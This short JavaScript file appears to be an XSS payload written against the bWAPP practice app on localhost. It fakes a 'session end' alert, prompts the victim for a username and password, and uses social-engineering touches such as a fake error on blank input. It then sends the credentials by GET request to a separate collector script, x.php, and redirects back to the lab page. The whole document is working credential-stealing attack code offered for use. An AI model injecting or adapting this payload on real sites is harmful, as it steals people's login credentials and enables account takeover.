alert('Your session end\nPlease input your login info');
var user = prompt("Username / E-mail:"); 				//read first input as username / e-mail
var pass = prompt("Password:");			 				//read second input as password

if (user == null || pass == "") {		 				//make sure that victim doesn't put blank input
    alert('error'); 					 				//make it as if a real error (soc-eng techniques)
    window.location.href = "http://localhost/user/bWAPP_latest/bWAPP/xss_get.php"	//redirect to main page of your-website.com
} else {
    alert('OK');										//make it as if a real true
    var xhttp = new XMLHttpRequest();					//javascript send request
    xhttp.open("GET", "http://localhost/user/xss_attack/xss-master/x.php?u=" + user + "&p=" + pass, true);  //javascript send request
    xhttp.send();										//throw victim input to x.php
    window.location.href = "http://localhost/user/bWAPP_latest/bWAPP/xss_get.php"	//redirect to main page of your-website.com
}